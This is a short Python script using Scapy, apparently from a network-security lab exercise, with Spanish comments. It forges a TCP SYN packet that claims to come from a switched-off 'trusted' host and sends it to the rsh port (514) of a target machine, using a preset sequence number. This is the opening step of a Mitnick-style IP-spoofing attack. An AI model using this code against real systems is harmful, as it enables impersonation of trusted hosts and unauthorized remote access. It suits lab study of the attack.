#!/usr/bin/python3
from scapy.all import *

#La máquina src es la Trusted, que está apagada
ip = IP(src="10.9.0.6", dst="10.9.0.5")
#seq y puertos se obtienen del ejemplo de listing 1
tcp = TCP(sport=1023, dport=514, flags="S", seq=778933536)

package_syn = ip/tcp
ls(package_syn)
send(package_syn,verbose=0)